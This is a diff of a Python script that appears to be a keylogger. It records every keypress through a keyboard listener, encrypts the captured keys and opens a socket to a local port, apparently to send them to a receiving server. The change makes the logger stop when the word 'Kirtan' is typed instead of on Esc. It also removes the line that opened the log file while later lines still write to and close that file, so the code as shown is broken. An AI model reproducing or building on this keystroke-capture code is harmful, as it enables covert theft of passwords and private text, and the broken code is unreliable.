@@ -8,10 +8,12 @@ from Encription_File import *
 import socket
 
 Stroke = None
+Exit_word = None
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client_socket.connect(('localhost', 13579))
+key_sequence = []
+target_sequence = "Kirtan"
 
-#storage = open('KeyBoard_Save.txt', 'a')
 
 def record_click(key):
     global Stroke  # Declare that we are using the global variable
@@ -20,12 +22,21 @@ def record_click(key):
         encription(Stroke)
     except AttributeError:
         storage.write(f'[{key}]')
+    global key_sequence
+    try:
+        key_sequence.append(key.char)
+        
+        key_sequence = key_sequence[-len(target_sequence):]
 
-def on_release(key):
-    if key == keyboard.Key.esc:
-        return False  # Stop listener
+        if ''.join(key_sequence) == target_sequence:
+            print(f"Sequence '{target_sequence}' entered!")
+            return False  # Stop listener
 
-with keyboard.Listener(on_press=record_click, on_release=on_release) as listener:
+    except AttributeError:
+        pass
+
+
+with keyboard.Listener(on_press=record_click) as listener:
     listener.join()
 
 storage.close()
